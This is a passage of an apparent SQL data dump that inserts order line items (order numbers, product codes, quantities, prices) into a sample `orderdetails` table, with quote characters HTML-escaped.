\u0026#39;30\u0026#39;, \u0026#39;87.13\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10244\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;54.96\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10244\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;85.87\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10244\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;87.30\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10244\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;42.11\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10244\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;97.39\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10245\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;195.01\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10245\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;147.74\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10245\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;120.27\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10245\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;114.34\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10245\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;111.39\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10245\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;48.80\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10245\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;81.86\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10245\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;54.94\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10245\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;81.93\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10246\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;99.54\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10246\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;144.08\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10246\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;100.64\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10246\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;57.73\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10246\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;145.63\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10246\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;46.24\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10246\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;118.84\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10246\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;34.65\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10246\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;100.54\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10246\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;45.45\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10246\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;113.44\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10247\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;195.33\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10247\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;140.50\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10247\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;167.83\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10247\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;143.62\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10247\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;58.41\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10247\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;51.55\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10248\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;126.48\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10248\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;80.86\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10248\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;133.86\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10248\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;95.80\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10248\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;87.77\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10248\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;122.89\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10248\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;85.85\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10248\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;83.02\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10248\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;66.00\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10248\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;81.41\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10248\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;69.39\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10248\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;84.14\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10248\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;92.36\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10248\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;53.51\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10249\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;88.93\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10249\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;54.81\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10249\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;65.75\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10249\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;85.99\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10249\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;49.16\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10250\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;148.23\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10250\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;84.48\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10250\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;95.20\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10250\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;63.22\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10250\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;61.42\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10250\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;72.45\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10250\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;99.89\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10250\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;62.60\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10250\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;36.66\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10250\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;91.34\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10250\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;90.75\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10250\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;98.48\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10250\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;76.00\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10250\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;65.89\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10251\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;59\u0026#39;, \u0026#39;93.79\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10251\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;115.37\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10251\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;172.36\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10251\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;129.53\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10251\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;58.15\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10251\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;91.29\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10252\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;74.78\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10252\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;145.52\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10252\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;50.36\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10252\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;127.97\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10252\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;63.03\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10252\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;69.52\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10252\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;36.21\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10252\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;93.89\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10252\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;72.41\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10253\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;157.60\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10253\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;102.17\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10253\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;67.03\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10253\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;109.40\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10253\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;130.22\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10253\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;103.29\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10253\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;67.76\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10253\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;130.87\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10253\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;114.84\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10253\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;145.63\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10253\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;139.87\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10253\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;34.74\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10253\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;50.82\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10253\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;115.15\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10254\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;137.70\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10254\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;55.09\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10254\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;102.98\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10254\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;80.99\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10254\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;59.87\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10254\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;66.88\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10254\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;43.27\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10254\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;28.88\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10254\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;85.42\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10254\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;111.57\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10254\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;69.34\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10254\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;101.73\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10254\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;39.80\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10255\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;135.00\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10255\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;37.63\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10256\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;93.49\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10256\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;52.83\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10257\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;92.19\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10257\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;59.34\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10257\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;83.78\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10257\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;91.27\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10257\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;81.81\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10258\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;177.87\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10258\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;133.94\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10258\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;113.17\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10258\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;49.81\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10258\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;62.70\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10258\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;86.99\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10259\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;121.15\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10259\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;117.32\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10259\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;134.26\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10259\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;120.28\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10259\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;59.55\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10259\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;152.41\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10259\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;107.76\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10259\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;46.82\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10259\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;121.40\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10259\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;31.47\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10259\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;95.35\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10259\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;45.99\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10259\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;105.33\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10260\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;180.79\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10260\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;140.50\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10260\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;169.56\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10260\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;121.57\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10260\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;92.77\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10260\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;137.88\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10260\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;117.10\u0026#39;, \u0026#39;10\u0026#39;); 